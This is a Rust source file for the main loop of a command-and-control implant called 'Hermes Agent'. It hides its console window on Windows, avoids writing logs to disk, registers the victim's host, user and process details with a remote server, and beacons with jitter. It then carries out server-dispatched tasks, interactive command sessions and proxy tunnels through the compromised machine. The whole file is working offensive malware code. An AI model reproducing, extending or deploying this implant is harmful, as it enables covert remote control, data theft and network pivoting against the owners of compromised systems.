//! Hermes Agent - Microkernel C2 Implant

#![allow(unused_variables)]
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

pub mod kernel;
pub mod ops;
pub mod protocol;
pub mod server;
pub mod services;
pub mod sys;

use kernel::Kernel;
use ops::AgentConfig;
use protocol::{AgentMessage, Config, ServerCommand};
use services::{HeartbeatService, NetworkService, ProxyService, SessionService, TaskService};
use std::{
    sync::{mpsc, Arc, Mutex},
    time::{Duration, SystemTime, UNIX_EPOCH},
};

// Agent never writes to disk — no logging, no file I/O outside of explicit
// user-requested operations (file upload/download, screenshot save).
macro_rules! alog { ($($arg:tt)*) => {{}} }

/// Minimum reconnect backoff in seconds.
const MIN_BACKOFF_SECS: u64 = 3;
/// Maximum reconnect backoff in seconds.
const MAX_BACKOFF_SECS: u64 = 60;
/// Backoff multiplier applied per consecutive failure.
const BACKOFF_MULTIPLIER: f64 = 2.0;
/// Random jitter percentage added to backoff.
const JITTER_PERCENT: u64 = 20;

fn main() {

    let cfg = match Config::load() {
        Ok(c) => c,
        Err(_) => std::process::exit(0),
    };

    let kernel = Kernel::new();

    let op_cfg = AgentConfig {
        agent_id: cfg.metadata.agent_id.clone(),
        hostname: cfg.metadata.hostname.clone(),
        username: cfg.metadata.username.clone(),
        pid: cfg.metadata.pid,
        max_output_chars: cfg.max_output_chars,
        max_list_entries: cfg.max_list_entries,
        command_timeout_secs: cfg.command_timeout_secs,
    };

    let (outbox_tx, outbox_rx) = mpsc::channel::<AgentMessage>();
    let network = Arc::new(Mutex::new(NetworkService::new()));
    let heartbeat = Arc::new(Mutex::new(HeartbeatService::new()));
    heartbeat
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .update(cfg.heartbeat_secs, cfg.jitter);
    let task = Arc::new(Mutex::new(TaskService::new(
        op_cfg.clone(),
        outbox_tx.clone(),
    )));
    let session = Arc::new(Mutex::new(SessionService::new(op_cfg, outbox_tx.clone())));
    let proxy = Arc::new(Mutex::new(ProxyService::new(outbox_tx.clone())));

    let mut reconnect_attempts: u32 = 0;

    loop {
        // Reset all service state before each reconnect attempt so stale
        // task/session/proxy state from a dead connection does not leak.
        task.lock()
            .unwrap_or_else(|e| e.into_inner())
            .reset();
        session.lock()
            .unwrap_or_else(|e| e.into_inner())
            .reset();
        proxy.lock()
            .unwrap_or_else(|e| e.into_inner())
            .reset();

        alog!("run_once starting (attempt {})", reconnect_attempts);
        if run_once(
            &kernel, &cfg, &network, &heartbeat, &task, &session, &proxy, &outbox_tx, &outbox_rx,
        )
        .is_ok()
        {
            alog!("run_once returned Ok, resetting backoff");
            reconnect_attempts = 0;
        } else {
            alog!("run_once failed");
            reconnect_attempts = reconnect_attempts.saturating_add(1);
        }

        let backoff = compute_backoff(reconnect_attempts);
        alog!("reconnect in {}s", backoff);
        kernel.sleep(Duration::from_secs(backoff));
    }
}

/// Compute exponential backoff with jitter based on consecutive attempt count.
fn compute_backoff(attempts: u32) -> u64 {
    if attempts == 0 {
        return MIN_BACKOFF_SECS;
    }
    let base = (MIN_BACKOFF_SECS as f64) * BACKOFF_MULTIPLIER.powi(attempts as i32);
    let capped = base.min(MAX_BACKOFF_SECS as f64) as u64;

    // Deterministic-ish jitter from SystemTime nanos (no rand dependency).
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0);
    let max_jitter = capped * JITTER_PERCENT / 100;
    let jitter = if max_jitter > 0 {
        seed % (max_jitter + 1)
    } else {
        0
    };
    capped.saturating_add(jitter)
}

fn run_once(
    kernel: &Kernel,
    cfg: &Config,
    network: &Arc<Mutex<NetworkService>>,
    heartbeat: &Arc<Mutex<HeartbeatService>>,
    task: &Arc<Mutex<TaskService>>,
    session: &Arc<Mutex<SessionService>>,
    proxy: &Arc<Mutex<ProxyService>>,
    outbox_tx: &mpsc::Sender<AgentMessage>,
    outbox_rx: &mpsc::Receiver<AgentMessage>,
) -> Result<(), ()> {
    // Do NOT clear the outbox here — pending task results must survive
    // reconnects.  They will be flushed after successful registration.

    // Connect
    {
        let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
        if !net.connect(&cfg.server_addr()) {
            alog!("connect failed to {}", cfg.server_addr());
            return Err(());
        }
        alog!("connected to {}", cfg.server_addr());
    }

    // Receive hello
    let hello = {
        let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
        net.receive_hello()
    };

    // Build register
    let (sleep_interval, jitter) = {
        let heartbeat = heartbeat.lock().unwrap_or_else(|e| e.into_inner());
        (heartbeat.interval_secs(), heartbeat.jitter())
    };
    let register = protocol::build_register(cfg, hello.as_ref(), sleep_interval, jitter);

    // Send register
    {
        let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
        if net.send(&register).is_err() {
            alog!("register send failed");
            return Err(());
        }
        alog!("register sent");
    }

    // Flush any outbox messages that accumulated while we were disconnected
    // (e.g. task results that completed between disconnect and reconnect).
    flush_outbox(network, outbox_rx, None)?;

    loop {
        let heartbeat_wait = heartbeat.lock().unwrap_or_else(|e| e.into_inner()).wait_duration();
        let wait = if session.lock().unwrap_or_else(|e| e.into_inner()).should_poll_fast()
            || proxy.lock().unwrap_or_else(|e| e.into_inner()).should_poll_fast()
        {
            heartbeat_wait.min(Duration::from_millis(100))
        } else {
            heartbeat_wait
        };

        let line = {
            let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
            net.read_line(wait)
        };

        match line {
            Ok(Some(line)) => {
                alog!("read_line got: {}", &line[..line.len().min(200)]);
                let cmd: ServerCommand = match serde_json::from_str(&line) {
                    Ok(c) => c,
                    Err(_) => continue,
                };

                match cmd {
                    ServerCommand::Ack { message } => {
                        alog!("registration acknowledged: {}", message);
                    }
                    ServerCommand::Disconnect { .. } => {
                        alog!("got Disconnect, returning Ok");
                        return Ok(());
                    }
                    ServerCommand::DispatchTask {
                        task_id,
                        command,
                        payload,
                    } => {
                        task.lock()
                            .unwrap_or_else(|e| e.into_inner())
                            .dispatch(&task_id, &command, payload.as_deref());
                    }
                    ServerCommand::ExecuteCommandSession {
                        command_session_id,
                        request_id,
                        line,
                    } => {
                        session
                            .lock()
                            .unwrap_or_else(|e| e.into_inner())
                            .execute(&command_session_id, &request_id, &line);
                    }
                    ServerCommand::OpenCommandSession { command_session_id } => {
                        session.lock().unwrap_or_else(|e| e.into_inner()).open(&command_session_id);
                    }
                    ServerCommand::CloseCommandSession { command_session_id } => {
                        session.lock().unwrap_or_else(|e| e.into_inner()).close(&command_session_id);
                    }
                    ServerCommand::CancelTask { task_id } => {
                        task.lock().unwrap_or_else(|e| e.into_inner()).cancel(&task_id);
                    }
                    ServerCommand::UpdateBeaconConfig {
                        request_id,
                        sleep_interval,
                        jitter,
                    } => {
                        heartbeat.lock().unwrap_or_else(|e| e.into_inner()).update(sleep_interval, jitter);
                        let _ = outbox_tx.send(AgentMessage::ConfigUpdated {
                            request_id,
                            sleep_interval,
                            jitter,
                        });
                    }
                    ServerCommand::OpenProxy {
                        proxy_id,
                        bind_addr,
                    } => {
                        proxy.lock().unwrap_or_else(|e| e.into_inner()).open(&proxy_id, &bind_addr);
                    }
                    ServerCommand::ProxyConnect {
                        proxy_id,
                        stream_id,
                        host,
                        port,
                    } => {
                        proxy
                            .lock()
                            .unwrap_or_else(|e| e.into_inner())
                            .connect(&proxy_id, &stream_id, &host, port);
                    }
                    ServerCommand::ProxyData {
                        proxy_id,
                        stream_id,
                        data_base64,
                    } => {
                        proxy
                            .lock()
                            .unwrap_or_else(|e| e.into_inner())
                            .data(&proxy_id, &stream_id, &data_base64);
                    }
                    ServerCommand::ProxyClose {
                        proxy_id,
                        stream_id,
                    } => {
                        proxy.lock().unwrap_or_else(|e| e.into_inner()).close_stream(&proxy_id, &stream_id);
                    }
                    ServerCommand::CloseProxy { proxy_id } => {
                        proxy.lock().unwrap_or_else(|e| e.into_inner()).close_proxy(&proxy_id);
                    }
                    _ => {
                        alog!("unhandled ServerCommand: {}", line);
                    }
                }

                flush_outbox(network, outbox_rx, None)?;
            }
            Ok(None) => {
                alog!("read_line returned Ok(None) - server closed connection");
                return Ok(());
            }
            Err(_) => {
                let poll_fast = session.lock().unwrap_or_else(|e| e.into_inner()).should_poll_fast()
                    || proxy.lock().unwrap_or_else(|e| e.into_inner()).should_poll_fast();
                let hb_due = heartbeat.lock().unwrap_or_else(|e| e.into_inner()).should_send();
                alog!("read timeout: poll_fast={} hb_due={}", poll_fast, hb_due);
                if poll_fast {
                    flush_outbox(network, outbox_rx, None)?;
                    alog!("after cmd/proxy flush_outbox OK, looping");
                    session.lock().unwrap_or_else(|e| e.into_inner()).clear_flush_hint();
                    proxy.lock().unwrap_or_else(|e| e.into_inner()).clear_flush_hint();
                }
                if heartbeat.lock().unwrap_or_else(|e| e.into_inner()).should_send() {
                    alog!("sending heartbeat");
                    flush_outbox(
                        network,
                        outbox_rx,
                        Some(AgentMessage::Heartbeat {
                            agent_id: Some(cfg.metadata.agent_id.clone()),
                        }),
                    )?;
                    heartbeat.lock().unwrap_or_else(|e| e.into_inner()).sent();
                }
            }
        }
    }
}

fn flush_outbox(
    network: &Arc<Mutex<NetworkService>>,
    outbox_rx: &mpsc::Receiver<AgentMessage>,
    heartbeat: Option<AgentMessage>,
) -> Result<(), ()> {
    let mut messages = Vec::new();
    if let Some(heartbeat) = heartbeat {
        messages.push(heartbeat);
    }
    while let Ok(message) = outbox_rx.try_recv() {
        messages.push(message);
    }
    if messages.is_empty() {
        return Ok(());
    }

    let mut net = network.lock().unwrap_or_else(|e| e.into_inner());
    for message in messages {
        net.send(&message)?;
    }
    Ok(())
}
